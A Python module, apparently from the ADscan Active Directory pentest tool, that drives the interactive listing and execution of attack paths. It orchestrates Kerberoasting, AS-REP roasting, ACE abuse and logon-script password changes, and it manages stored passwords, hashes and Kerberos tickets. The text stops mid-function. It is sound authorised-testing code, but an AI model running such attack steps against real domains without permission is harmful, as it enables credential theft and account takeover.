"""Attack path execution UX helpers.

This module centralizes the interactive UX for:
- listing attack paths (already computed from `attack_graph.json`)
- letting the user inspect details
- optionally executing a selected path by mapping its steps to existing ADscan actions

The goal is to reuse this flow from multiple places (e.g. Phase 2 summary,
`ask_for_user_privs`, future phases) without duplicating prompt logic.
"""

from __future__ import annotations

from enum import Enum
from typing import Any, Callable
from contextlib import contextmanager
from datetime import UTC, datetime
import asyncio
import os
import re
import secrets
import time

from rich.prompt import Confirm, Prompt
from rich.table import Table
from rich.text import Text

from adscan_internal import (
    get_console,
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_warning,
    print_warning_debug,
    telemetry,
)
from adscan_internal.interaction import is_non_interactive
from adscan_internal.reporting_compat import load_optional_report_service_attr
from adscan_internal.passwords import (
    generate_compliant_password,
    validate_against_policy,
)
from adscan_internal.rich_output import (
    BRAND_COLORS,
    mark_sensitive,
    order_attack_paths_for_display,
    print_panel,
    print_system_change_warning,
    print_attack_path_detail,
    print_attack_paths_summary,
)
from adscan_internal.services.attack_graph_service import (
    infer_directory_object_enabled_state,
    get_node_by_label,
    get_attack_path_summaries,
    resolve_netexec_target_for_node_label,
    resolve_group_name_by_rid,
    resolve_group_user_members,
    update_edge_status_by_labels,
)
from adscan_internal.services.credential_store_service import (
    get_capability_bearing_ccache,
    resolve_execution_credential,
)
from adscan_internal.services.attack_graph_runtime_service import (
    clear_attack_path_execution,
    get_attack_path_followup_context,
    get_attack_path_step_context,
    set_attack_path_step_context,
    set_attack_path_execution,
)
from adscan_internal.cli.roasting_execution import (
    run_asreproast_for_user,
    run_kerberoast_for_user,
)
from adscan_internal.cli.ace_step_execution import (
    ACL_ACE_RELATIONS,
    build_ace_step_context,
    describe_ace_relation_support,
    describe_ace_step_support,
    execute_ace_step,
    get_last_ace_execution_outcome,
    resolve_execution_user as _shared_resolve_execution_user,
)
from adscan_internal.cli.control_escalation import (
    ensure_control_to_wield_next_edge,
)
from adscan_internal.cli.attack_step_followups import (
    build_followups_for_execution_outcome,
    build_followups_for_step,
    execute_guided_followup_actions,
)
from adscan_internal.services.attack_step_support_registry import (
    CONTEXT_ONLY_RELATIONS,
    POLICY_BLOCKED_RELATIONS,
    SUPPORTED_RELATION_NOTES,
    build_path_execution_priority_key,
    classify_relation_support,
    describe_search_mode_label,
    describe_path_target_outcome,
    normalize_search_mode_label,
)
from adscan_internal.services.ldap_transport_service import (
    prepare_kerberos_ldap_environment,
)
from adscan_internal.services.attack_step_catalog import (
    build_step_knowledge,
    relation_counts_for_execution_readiness,
    relation_requires_execution_context,
)
from adscan_internal.services.attack_step_target_access_service import (
    resolve_attack_step_target_access_profile,
)
from adscan_internal.services.attack_path_cleanup_service import (
    begin_cleanup_scope,
    discard_cleanup_scope,
    execute_cleanup_scope,
    has_active_cleanup_scope,
    register_cleanup_from_outcome,
)
from adscan_internal.services.attack_path_target_viability_service import (
    assess_computer_target_viability,
)
from adscan_internal.services.pivot_opportunity_service import (
    ensure_host_bound_workflow_target_viable,
    maybe_offer_pivot_opportunity_for_host_viability,
)
from adscan_internal.services.logon_script_payload_service import (
    build_force_change_password_logon_script,
)
from adscan_internal.services.kerberos_ticket_service import KerberosTicketService
from adscan_internal.services.async_bridge import run_async_sync
from adscan_internal.services.network_probe_service import (
    TCPProbeResult,
    SERVICE_PROBE_PORTS,
    action_to_service_ports,
    tcp_probe_multi,
)
from adscan_internal.services.smb_privilege import (
    SMBPrivilegeStatus,
    verify_domain_user_local_admin,
)
from adscan_internal.services.rdp_login_service import scan_rdp_hosts
from adscan_internal.services.winrm_access_probe_service import probe_winrm_available
from adscan_internal.integrations.mssql.native_backend import ImpacketMSSQLBackend
from adscan_internal.workspaces import domain_subpath, write_json_file
from adscan_internal.models.domain import resolve_dc_ip


ATTACK_PATH_SNAPSHOT_FILENAME = "attack_paths_snapshot.json"


def _summary_target_priority_class(summary: dict[str, Any]) -> str:
    """Return the normalized target priority class for one path summary."""
    value = str(summary.get("target_priority_class") or "").strip().lower()
    if value in {"tierzero", "highvalue", "pivot"}:
        return value
    if bool(summary.get("is_tier_zero")):
        return "tierzero"
    if bool(summary.get("target_is_high_value")):
        return "highvalue"
    return "pivot"


def _sort_target_priority_groups(
    summaries: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Return summaries ordered by the canonical ADscan execution priority."""
    return sorted(summaries, key=build_path_execution_priority_key)


def _summary_search_mode_label(summary: dict[str, Any]) -> str:
    """Return the per-summary outcome label used by execution UX."""
    return describe_path_target_outcome(summary)


def _normalize_account(value: str) -> str:
    name = (value or "").strip()
    if "\\" in name:
        name = name.split("\\", 1)[1]
    if "@" in name:
        name = name.split("@", 1)[0]
    return name.strip().lower()


def _is_audit_mode(shell: Any) -> bool:
    """Return whether the current shell is running in audit mode."""
    return str(getattr(shell, "type", "") or "").strip().lower() == "audit"


def _get_stored_domain_credential_for_user(
    shell: Any, *, domain: str, username: str
) -> str | None:
    """Return stored credential for a domain user using case-insensitive lookup.

    Prefers a password / NT hash from the ``credentials`` map. Falls back to a
    registered Kerberos ccache path from ``kerberos_tickets`` when no password/
    hash is stored — the NTLM-disabled / AES-only case, where a PKINIT TGT
    (e.g. from ADCS Pass-the-Certificate) is the only usable credential. The
    ccache path is itself a valid credential: downstream Kerberos-backed steps
    (DCSync/DRSUAPI, LDAP, SMB) accept a ``.ccache`` path and select it.
    """
    normalized_target = _normalize_account(username)
    if not normalized_target:
        return None
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    # Capability-bearing override (ESC13 PtC): when a ccache is explicitly marked
    # prefer-over-password for THIS user, hand it back instead of the password —
    # the password cannot reproduce the synthetic PAC group SID. Marker absent
    # for the user => keep the password-first default below (no global change).
    capability_ccache = get_capability_bearing_ccache(
        getattr(shell, "domains_data", {}), domain=domain, username=normalized_target
    )
    if capability_ccache:
        return capability_ccache
    credentials = domain_data.get("credentials")
    if isinstance(credentials, dict):
        for stored_user, stored_credential in credentials.items():
            if _normalize_account(str(stored_user)) != normalized_target:
                continue
            if isinstance(stored_credential, str) and stored_credential.strip():
                return stored_credential.strip()
            break
    # Fallback: a registered Kerberos ccache (no password/hash available).
    # kerberos_tickets maps {username: ccache_path} and is populated by
    # Pass-the-Certificate even when UnPAC-the-hash recovered no NT hash.
    kerberos_tickets = domain_data.get("kerberos_tickets")
    if isinstance(kerberos_tickets, dict):
        for stored_user, ticket_path in kerberos_tickets.items():
            if _normalize_account(str(stored_user)) != normalized_target:
                continue
            if isinstance(ticket_path, str) and ticket_path.strip():
                return ticket_path.strip()
            break
    return None


def _env_flag_enabled(name: str) -> bool:
    """Return True when an environment flag is enabled."""
    return str(os.getenv(name, "")).strip().lower() in {
        "1",
        "true",
        "yes",
        "on",
    }


def _env_int(name: str, default: int, *, minimum: int = 0) -> int:
    """Read an integer env var with fallback and floor."""
    raw = str(os.getenv(name, str(default))).strip()
    try:
        value = int(raw)
    except (TypeError, ValueError):
        value = default
    return max(minimum, value)


def _is_adscan_managed_logon_script_path(path_value: str) -> bool:
    """Return whether one scriptPath value points to an ADscan-managed artifact."""
    basename = (
        os.path.basename(str(path_value or "").replace("\\", "/")).strip().lower()
    )
    return (
        bool(basename) and basename.startswith("adscan-") and basename.endswith(".bat")
    )


def _join_smb_path(directory_path: str, filename: str) -> str:
    """Join one SMB directory path and one filename using backslashes."""
    dir_clean = str(directory_path or "").strip().replace("/", "\\").strip("\\")
    file_clean = str(filename or "").strip().replace("/", "\\").strip("\\")
    if not dir_clean:
        return file_clean
    if not file_clean:
        return dir_clean
    return f"{dir_clean}\\{file_clean}"


def _get_pending_writelogonscript_manual_validations(
    shell: Any,
) -> list[dict[str, Any]]:
    """Return the mutable in-memory list of pending manual validations."""
    existing = getattr(shell, "_pending_writelogonscript_manual_validations", None)
    if isinstance(existing, list):
        return existing
    pending: list[dict[str, Any]] = []
    setattr(shell, "_pending_writelogonscript_manual_validations", pending)
    return pending


def _update_attack_path_step_status_at_index(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    step_index: int,
    status: str,
    notes: dict[str, Any] | None = None,
) -> None:
    """Update one summary step and its matching graph edge when labels are known."""
    steps = summary.get("steps")
    if not isinstance(steps, list):
        return
    if step_index < 0 or step_index >= len(steps):
        return
    step = steps[step_index]
    if not isinstance(step, dict):
        return

    merged_notes: dict[str, Any] = {}
    existing_details = step.get("details")
    if isinstance(existing_details, dict):
        merged_notes.update(existing_details)
    if isinstance(notes, dict):
        merged_notes.update(notes)

    step["status"] = status
    step["details"] = merged_notes

    action = str(step.get("action") or "").strip()
    from_label = str(merged_notes.get("from") or "").strip()
    to_label = str(merged_notes.get("to") or "").strip()
    if not action or not from_label or not to_label:
        return
    _update_attack_path_edge_status(
        shell,
        domain,
        from_label=from_label,
        relation=action,
        to_label=to_label,
        status=status,
        notes=merged_notes,
    )


def _update_attack_path_edge_status(
    shell: Any,
    domain: str,
    *,
    from_label: str,
    relation: str,
    to_label: str,
    status: str,
    notes: dict[str, Any] | None = None,
) -> bool:
    """Persist one attack-path edge status using the active-step updater when possible."""
    active = getattr(shell, "_active_attack_graph_step", None)
    active_domain = str(getattr(active, "domain", "") or "").strip()
    active_from = str(getattr(active, "from_label", "") or "").strip()
    active_relation = str(getattr(active, "relation", "") or "").strip()
    active_to = str(getattr(active, "to_label", "") or "").strip()
    updater = getattr(shell, "_update_active_attack_graph_step_status", None)
    if (
        callable(updater)
        and active_domain == str(domain or "").strip()
        and active_from == str(from_label or "").strip()
        and active_relation == str(relation or "").strip()
        and active_to == str(to_label or "").strip()
    ):
        return bool(updater(domain=domain, status=status, notes=notes))
    return bool(
        update_edge_status_by_labels(
            shell,
            domain,
            from_label=from_label,
            relation=relation,
            to_label=to_label,
            status=status,
            notes=notes,
        )
    )


def register_writelogonscript_manual_validation(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
    summary: dict[str, Any],
    from_label: str,
    to_label: str,
) -> None:
    """Register one manual validation handoff for a staged WriteLogonScript step."""
    pending = _get_pending_writelogonscript_manual_validations(shell)
    entry = {
        "domain": str(domain or "").strip().lower(),
        "username": _normalize_account(username),
        "credential": str(credential or ""),
        "summary": summary,
        "from_label": str(from_label or ""),
        "to_label": str(to_label or ""),
        "registered_at": datetime.now(UTC).isoformat(),
    }
    pending[:] = [
        item
        for item in pending
        if not (
            str(item.get("domain") or "").strip().lower() == entry["domain"]
            and str(item.get("username") or "").strip() == entry["username"]
        )
    ]
    pending.append(entry)
    print_info_debug(
        "[writelogonscript] registered pending manual validation: "
        f"domain={mark_sensitive(entry['domain'], 'domain')} "
        f"user={mark_sensitive(entry['username'], 'user')}"
    )


def match_writelogonscript_manual_validation(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
) -> dict[str, Any] | None:
    """Return one pending manual validation matching a manual credential save."""
    normalized_domain = str(domain or "").strip().lower()
    normalized_user = _normalize_account(username)
    raw_credential = str(credential or "")
    for item in _get_pending_writelogonscript_manual_validations(shell):
        if str(item.get("domain") or "").strip().lower() != normalized_domain:
            continue
        if str(item.get("username") or "").strip() != normalized_user:
            continue
        if str(item.get("credential") or "") != raw_credential:
            continue
        return item
    return None


def clear_writelogonscript_manual_validation(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
) -> None:
    """Clear one consumed pending manual validation entry."""
    normalized_domain = str(domain or "").strip().lower()
    normalized_user = _normalize_account(username)
    raw_credential = str(credential or "")
    pending = _get_pending_writelogonscript_manual_validations(shell)
    pending[:] = [
        item
        for item in pending
        if not (
            str(item.get("domain") or "").strip().lower() == normalized_domain
            and str(item.get("username") or "").strip() == normalized_user
            and str(item.get("credential") or "") == raw_credential
        )
    ]


def _get_writelogonscript_lockout_policy_state(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> dict[str, Any]:
    """Return whether automatic post-stage validation is safe for this domain.

    Reads the domain lockout threshold via a FRESH native LDAP query
    (``fetch_spray_policy_native`` — the same SSOT the spray path uses, which
    never trusts a cached lockout value because a reactively-tightened GPO can
    lock real accounts) instead of an ``nxc --pass-pol`` subprocess. Auto-
    validation is safe iff no lockout is enforced (threshold absent/0); a
    positive threshold means an auth attempt could count toward lockout, so
    auto-validation is withheld.
    """
    from adscan_internal.models.domain import resolve_dc_ip
    from adscan_internal.services.async_bridge import run_async_sync
    from adscan_internal.services.spray_policy_service import (
        fetch_spray_policy_native,
    )

    domain_data = getattr(shell, "domains_data", {}).get(domain, {}) or {}
    dc_ip = resolve_dc_ip(domain_data)
    if not dc_ip or not username or not password:
        return {
            "policy_known": False,
            "auto_validation_safe": False,
            "lockout_threshold": None,
            "explicit_none": False,
            "error": "Missing PDC or authenticated credential for the lockout-policy read.",
        }

    try:
        policy = run_async_sync(
            fetch_spray_policy_native(
                domain=domain,
                dc_ip=dc_ip,
                username=username,
                password=password,
            )
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        return {
            "policy_known": False,
            "auto_validation_safe": False,
            "lockout_threshold": None,
            "explicit_none": False,
            "error": str(exc),
        }

    threshold = getattr(
        getattr(policy, "default_policy", None), "lockout_threshold", None
    )
    if threshold is None:
        return {
            "policy_known": False,
            "auto_validation_safe": False,
            "lockout_threshold": None,
            "explicit_none": False,
            "error": "Native lockout-policy read returned no parseable threshold.",
        }
    if int(threshold) == 0:
        # lockoutThreshold=0 → lockout disabled → auto-validation is safe.
        return {
            "policy_known": True,
            "auto_validation_safe": True,
            "lockout_threshold": 0,
            "explicit_none": True,
            "error": "",
        }
    return {
        "policy_known": True,
        "auto_validation_safe": False,
        "lockout_threshold": int(threshold),
        "explicit_none": False,
        "error": "",
    }


def _render_writelogonscript_manual_validation_panel(
    *,
    domain: str,
    target_user: str,
    credential: str,
    policy_state: dict[str, Any],
) -> None:
    """Render operator guidance when auto-validation is unsafe."""
    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(target_user, "user")
    lockout_threshold = policy_state.get("lockout_threshold")
    if policy_state.get("explicit_none"):
        threshold_label = "None"
    elif lockout_threshold is None:
        threshold_label = "Unknown"
    else:
        threshold_label = str(lockout_threshold)
    message = Text()
    message.append(
        "Automatic WriteLogonScript credential validation was skipped.\n",
        style="bold yellow",
    )
    message.append(
        f"Target user: {marked_user}\n"
        f"Domain: {marked_domain}\n"
        f"Account lockout threshold: {mark_sensitive(threshold_label, 'text')}\n\n",
        style="bold",
    )
    message.append("Why ADscan stopped here:\n", style="bold")
    message.append(
        " - Automatic LDAP polling would repeatedly test the staged password.\n"
        " - In a domain with lockout enforcement, those retries could lock the account.\n\n",
        style="dim",
    )
    message.append("Recommended next step:\n", style="bold")
    message.append(
        " - Wait for the target user to log on and trigger the script.\n"
        " - Validate the new credential manually and carefully, using as few attempts as possible.\n"
        " - Once confirmed, save it in ADscan with:\n",
        style="dim",
    )
    message.append(
        f"   creds save {domain} {target_user} {credential}\n\n",
        style="bold cyan",
    )
    message.append(
        "When you save that exact credential in this session, ADscan will trust the manual validation "
        "and attempt the pending WriteLogonScript cleanup automatically.",
        style="dim",
    )
    print_panel(
        message,
        title=Text("Manual Validation Required", style="bold yellow"),
        border_style="yellow",
        expand=False,
    )


def persist_attack_path_snapshot(
    shell: Any,
    domain: str,
    *,
    summaries: list[dict[str, Any]] | None,
    scope: str,
    target: str,
    target_mode: str,
    search_mode_label: str | None = None,
) -> None:
    """Persist the latest CLI-computed attack-path summaries for web consumption.

    This is best-effort only and must never affect the existing CLI flow.
    """
    if not summaries:
        return

    try:
        workspace_cwd = (
            shell._get_workspace_cwd()
            if hasattr(shell, "_get_workspace_cwd")
            else getattr(shell, "current_workspace_dir", os.getcwd())
        )
        output_path = domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            domain,
            ATTACK_PATH_SNAPSHOT_FILENAME,
        )
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        snapshot_paths: list[dict[str, Any]] = []
        for index, summary in enumerate(summaries, start=1):
            if not isinstance(summary, dict):
                continue
            nodes = (
                summary.get("nodes") if isinstance(summary.get("nodes"), list) else []
            )
            relations = (
                summary.get("relations")
                if isinstance(summary.get("relations"), list)
                else []
            )
            steps = (
                summary.get("steps") if isinstance(summary.get("steps"), list) else []
            )
            # Enrich each step with a self-describing ``knowledge`` sub-object
            # (canonical technique prose — description/impact/remediation/
            # remediation_options/references — pulled from VULN_CATALOG via the
            # step's ``vuln_key`` join, plus edge-specific step_summary,
            # remediation_steps, narrative, and mitre_*). The ``vuln_key`` is the
            # unification join back to the matching finding.
            # Steps without a catalog entry carry no ``knowledge`` key. Build
            # enriched copies so the shared summary objects are not mutated.
            enriched_steps: list[Any] = []
            for raw_step in steps:
                if not isinstance(raw_step, dict):
                    enriched_steps.append(raw_step)
                    continue
                step_copy = dict(raw_step)
                knowledge = build_step_knowledge(raw_step)
                if knowledge:
                    step_copy["knowledge"] = knowledge
                enriched_steps.append(step_copy)
            steps = enriched_steps
            snapshot_paths.append(
                {
                    "id": str(
                        summary.get("id")
                        or f"{scope}:{index}:{summary.get('source')}->{summary.get('target')}"
                    ),
                    "index": index,
                    "source": str(summary.get("source") or ""),
                    "target": str(summary.get("target") or ""),
                    "length": int(summary.get("length") or 0),
                    "status": str(summary.get("status") or "theoretical"),
                    "is_high_value": bool(summary.get("target_is_high_value")),
                    "is_tier_zero": _summary_target_priority_class(summary)
                    == "tierzero",
                    "target_priority_class": _summary_target_priority_class(summary),
                    # Canonical compromise class stamped by
                    # ``apply_path_based_classification`` (CompromiseClass.value);
                    # serialized so the web consumes it directly instead of
                    # re-deriving the class with brittle string matching. ``None``
                    # when the record carries no class.
                    "compromise_class": (
                        str(summary.get("compromise_class"))
                        if summary.get("compromise_class")
                        else None
                    ),
                    "nodes": [str(node or "") for node in nodes],
                    "relations": [str(relation or "") for relation in relations],
                    "steps": steps,
                }
            )

        payload = {
            "schema_version": "1.0",
            "generated_at": datetime.now(UTC).isoformat(),
            "domain": domain,
            "scope": scope,
            "target": target,
            "target_mode": target_mode,
            "search_mode_label": search_mode_label,
            "path_count": len(snapshot_paths),
            "paths": snapshot_paths,
        }
        write_json_file(output_path, payload)
        print_info_debug(
            "[attack_paths] snapshot persisted: "
            f"domain={mark_sensitive(domain, 'domain')} "
            f"scope={scope} count={len(snapshot_paths)}"
        )
    except Exception as exc:  # pragma: no cover - best effort only
        telemetry.capture_exception(exc)
        print_info_debug(f"[attack_paths] snapshot persistence failed: {exc}")


def _attack_path_event_id(summary: dict[str, Any]) -> str:
    """Return a stable best-effort identifier for one attack path summary."""
    path_id = str(summary.get("id") or "").strip()
    if path_id:
        return path_id
    source = str(summary.get("source") or "unknown-source").strip()
    target = str(summary.get("target") or "unknown-target").strip()
    length = int(summary.get("length") or 0)
    return f"{source}->{target}:{length}"


def _count_executable_steps(
    steps: list[dict[str, Any]],
    *,
    non_executable_actions: set[str],
    dangerous_actions: set[str],
) -> int:
    """Return the number of executable steps in one path summary."""
    total = 0
    for step in steps:
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if not action:
            continue
        if action in non_executable_actions or action in dangerous_actions:
            continue
        total += 1
    return total


def _record_attack_path_execution_event(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    event_stage: str,
    message: str,
    step_index: int | None = None,
    total_steps: int | None = None,
    executable_step_index: int | None = None,
    last_executable_idx: int | None = None,
    action: str | None = None,
    from_label: str | None = None,
    to_label: str | None = None,
    step_status: str | None = None,
    reason: str | None = None,
    actor: str | None = None,
    target_host: str | None = None,
    search_mode_label: str | None = None,
) -> None:
    """Persist one structured attack-path execution event for web/live consumers.

    This is best-effort only and must never alter the existing CLI execution flow.
    """
    record_technical_event = load_optional_report_service_attr(
        "record_technical_event",
        action="Technical event sync",
        debug_printer=print_info_debug,
        prefix="[attack_paths]",
        module_name="adscan_internal.pro.services.report_service",
    )
    if not callable(record_technical_event):
        return

    try:
        details = {
            "source": "attack_path_execution",
            "event_stage": str(event_stage or "").strip(),
            "path_id": _attack_path_event_id(summary),
            "path_source": str(summary.get("source") or "").strip(),
            "path_target": str(summary.get("target") or "").strip(),
            "path_length": int(summary.get("length") or 0),
            "path_status": str(summary.get("status") or "theoretical").strip(),
            "is_high_value": bool(summary.get("target_is_high_value")),
            "is_tier_zero": _summary_target_priority_class(summary) == "tierzero",
            "target_priority_class": _summary_target_priority_class(summary),
            "step_index": int(step_index) if step_index is not None else None,
            "total_steps": int(total_steps) if total_steps is not None else None,
            "executable_step_index": (
                int(executable_step_index)
                if executable_step_index is not None
                else None
            ),
            "last_executable_idx": (
                int(last_executable_idx) if last_executable_idx is not None else None
            ),
            "action": str(action or "").strip() or None,
            "from": str(from_label or "").strip() or None,
            "to": str(to_label or "").strip() or None,
            "step_status": str(step_status or "").strip() or None,
            "reason": str(reason or "").strip() or None,
            "actor": str(actor or "").strip() or None,
            "target_host": str(target_host or "").strip() or None,
            "search_mode_label": str(search_mode_label or "").strip() or None,
        }
        details = {
            key: value for key, value in details.items() if value not in {None, ""}
        }
        record_technical_event(
            shell,
            domain,
            event_type="attack_path_execution",
            message=message,
            details=details,
        )
    except Exception as exc:  # pragma: no cover - best effort only
        telemetry.capture_exception(exc)
        print_info_debug(f"[attack_paths] execution event persistence failed: {exc}")


_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD = _env_int(
    "ADSCAN_ATTACK_PATH_AUTO_REFRESH_MAX_AFFECTED_USERS",
    150,
    minimum=0,
)


def _affected_user_count(summary: dict[str, Any]) -> int:
    """Return affected principal count (users + computers) from summary metadata.

    Returns ``affected_principal_count`` when present (set by
    ``apply_affected_user_metadata`` and covers both user and computer members).
    Falls back to ``affected_user_count`` for older cached records that pre-date
    computer-group support, and finally to the length of ``affected_users``.
    """
    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    if not isinstance(meta, dict):
        return 0
    principal_count = meta.get("affected_principal_count")
    if isinstance(principal_count, int) and principal_count >= 0:
        return principal_count
    count = meta.get("affected_user_count")
    if isinstance(count, int) and count >= 0:
        return count
    users = meta.get("affected_users")
    if isinstance(users, list):
        return len(users)
    return 0


def _get_stored_credential_map(shell: Any, domain: str) -> dict[str, str]:
    """Return stored domain credentials indexed by normalized username."""
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return {}
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        return {}
    creds = domain_data.get("credentials")
    if not isinstance(creds, dict):
        return {}
    normalized: dict[str, str] = {}
    for username in creds.keys():
        normalized_username = _normalize_account(str(username or ""))
        if not normalized_username:
            continue
        normalized[normalized_username] = str(username)
    return normalized


def _first_execution_readiness_step(
    summary: dict[str, Any],
) -> tuple[str, dict[str, Any]] | None:
    """Return the first path step that gates whether execution can start."""
    steps = summary.get("steps")
    if not isinstance(steps, list):
        return None
    for step in steps:
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if relation_counts_for_execution_readiness(action):
            details = step.get("details")
            if isinstance(details, dict):
                return action, details
    return None


def _execution_readiness_meta(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    context_username: str | None,
    context_password: str | None,
) -> dict[str, Any]:
    """Estimate whether a path has usable execution credential context."""
    step_info = _first_execution_readiness_step(summary)
    if step_info is None:
        return {}

    action, details = step_info
    from_label = str(details.get("from") or "")
    to_label = str(details.get("to") or "")
    stored_creds = _get_stored_credential_map(shell, domain)

    if action == "asreproasting":
        return {
            "execution_context_required": False,
            "execution_support_status": "supported",
            "execution_support_target_kind": "",
            "execution_target_enabled": None,
            "execution_target_enabled_source": "unknown",
            "execution_ready_count": 1,
            "execution_candidate_count": 1,
            "execution_candidate_source": "asreproasting_no_auth_required",
            "execution_readiness_reason": "asreproasting_no_auth_required",
            "execution_context_action": action,
        }

    if action == "kerberoasting":
        normalized_context_user = _normalize_account(context_username or "")
        if normalized_context_user:
            ready = bool(
                context_password
                or _resolve_domain_password(shell, domain, normalized_context_user)
            )
            return {
                "execution_context_required": True,
                "execution_support_status": "supported",
                "execution_support_target_kind": "",
                "execution_target_enabled": None,
                "execution_target_enabled_source": "unknown",
                "execution_ready_count": 1 if ready else 0,
                "execution_candidate_count": 1,
                "execution_candidate_source": "context_username",
                "execution_readiness_reason": (
                    "context_username"
                    if ready
                    else "context_username_missing_credential"
                ),
                "execution_context_action": action,
            }
        if stored_creds:
            return {
                "execution_context_required": True,
                "execution_support_status": "supported",
                "execution_support_target_kind": "",
                "execution_target_enabled": None,
                "execution_target_enabled_source": "unknown",
                "execution_ready_count": len(stored_creds),
                "execution_candidate_count": len(stored_creds),
                "execution_candidate_source": "all_stored_credentials_fallback",
                "execution_readiness_reason": "all_stored_credentials_fallback",
                "execution_context_action": action,
            }
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": "",
            "execution_target_enabled": None,
            "execution_target_enabled_source": "unknown",
            "execution_ready_count": 0,
            "execution_candidate_count": 0,
            "execution_candidate_source": "unresolved",
            "execution_readiness_reason": "no_stored_credentials_available",
            "execution_context_action": action,
        }

    if not relation_requires_execution_context(action):
        return {
            "execution_context_required": False,
            "execution_support_status": "supported",
            "execution_support_target_kind": "",
            "execution_target_enabled": None,
            "execution_target_enabled_source": "unknown",
            "execution_ready_count": 1,
            "execution_candidate_count": 1,
            "execution_candidate_source": "catalog_no_context_required",
            "execution_readiness_reason": "catalog_no_context_required",
            "execution_context_action": action,
        }

    target_kind = ""
    target_enabled: bool | None = None
    target_enabled_source = "unknown"
    target_viability_status = ""
    target_viability_summary = ""
    target_viability_reason = ""
    target_reachable: bool | None = None
    target_reachable_source = "unknown"
    target_resolved: bool | None = None
    target_matched_ips: tuple[str, ...] = ()
    target_vantage_mode = ""
    target_execution_advisory = ""
    target_access_profile = resolve_attack_step_target_access_profile(action)
    target_access_requirement = target_access_profile.legacy_requirement
    target_required_service = target_access_profile.required_service or ""
    target_required_ports: tuple[int, ...] = target_access_profile.required_ports
    target_access_mode = target_access_profile.access_mode
    target_access_rationale = target_access_profile.rationale
    to_node: dict[str, Any] | None = None
    if to_label:
        to_node = get_node_by_label(shell, domain, label=to_label)
        if isinstance(to_node, dict):
            kind = to_node.get("kind") or to_node.get("labels") or to_node.get("type")
            if isinstance(kind, list) and kind:
                target_kind = str(kind[0])
            elif isinstance(kind, str):
                target_kind = kind
            target_enabled, target_enabled_source = (
                infer_directory_object_enabled_state(
                    shell,
                    domain=domain,
                    principal_name=to_label,
                    principal_kind=target_kind,
                    node=to_node,
                )
            )
            if str(target_kind or "").strip().lower() == "computer":
                target_access_profile = resolve_attack_step_target_access_profile(
                    action,
                    target_kind=target_kind,
                )
                target_access_requirement = target_access_profile.legacy_requirement
                target_required_service = target_access_profile.required_service or ""
                target_required_ports = target_access_profile.required_ports
                target_access_mode = target_access_profile.access_mode
                target_access_rationale = target_access_profile.rationale
                target_viability = assess_computer_target_viability(
                    shell,
                    domain=domain,
                    principal_name=to_label,
                    node=to_node,
                    required_ports=target_required_ports,
                )
                target_viability_status = target_viability.status
                target_viability_summary = target_viability.operator_summary
                target_viability_reason = target_viability.debug_reason
                target_reachable = target_viability.reachable_from_current_vantage
                target_reachable_source = (
                    "current_vantage_reachability_report"
                    if target_viability.reachable_from_current_vantage is not None
                    else "unknown"
                )
                target_resolved = target_viability.resolved_in_current_vantage_inventory
                target_matched_ips = tuple(target_viability.matched_ips)
                target_vantage_mode = str(target_viability.vantage_mode or "")
                target_execution_advisory = str(
                    target_viability.execution_advisory or ""
                )
                from adscan_internal.services._annotation_log_dedup import (
                    annotation_log_seen,
                )
                # Dedup per (target, relation) within an annotation batch:
                # thousands of paths share the same blocking step, and the
                # repeated identical log line drowns the --debug output.
                if not annotation_log_seen(
                    ("target-access", str(to_label), str(action))
                ):
                    print_info_debug(
                        "[target-access] "
                        f"relation={mark_sensitive(action, 'detail')} "
                        f"target={mark_sensitive(to_label, 'node')} "
                        f"target_kind={mark_sensitive(target_kind, 'detail')} "
                        f"mode={mark_sensitive(target_access_mode, 'detail')} "
                        f"legacy_requirement={mark_sensitive(target_access_requirement, 'detail')} "
                        f"service={mark_sensitive(target_required_service or 'none', 'detail')} "
                        f"ports={mark_sensitive(str(list(target_required_ports)), 'detail')} "
                        f"viability_status={mark_sensitive(target_viability_status or 'unknown', 'detail')} "
                        f"matched_ips={mark_sensitive(str(list(target_matched_ips)), 'detail')}"
                    )
    if action in ACL_ACE_RELATIONS and to_label:
        supported, support_reason = describe_ace_relation_support(action, target_kind)
        if not supported:
            return {
                "execution_context_required": True,
                "execution_support_status": "unsupported",
                "execution_support_reason": support_reason or "Unsupported target type",
                "execution_support_target_kind": target_kind or "Unknown",
                "execution_target_enabled": target_enabled,
                "execution_target_enabled_source": target_enabled_source,
                "execution_target_viability_status": target_viability_status,
                "execution_target_viability_summary": target_viability_summary,
                "execution_target_viability_reason": target_viability_reason,
                "execution_target_reachable": target_reachable,
                "execution_target_reachable_source": target_reachable_source,
                "execution_target_resolved": target_resolved,
                "execution_target_matched_ips": list(target_matched_ips),
                "execution_target_vantage_mode": target_vantage_mode,
                "execution_target_execution_advisory": target_execution_advisory,
                "execution_target_access_requirement": target_access_requirement,
                "execution_target_access_mode": target_access_mode,
                "execution_target_required_service": target_required_service,
                "execution_target_required_ports": list(target_required_ports),
                "execution_target_access_rationale": target_access_rationale,
                "execution_target_label": to_label,
                "execution_ready_count": 0,
                "execution_candidate_count": 0,
                "execution_candidate_source": "unsupported",
                "execution_readiness_reason": "unsupported_target_type",
                "execution_context_action": action,
            }

    if (
        target_access_profile.block_on_unreachable
        and str(target_kind or "").strip().lower() == "computer"
    ):
        blocked_reason = ""
        support_reason = ""
        if target_enabled is False:
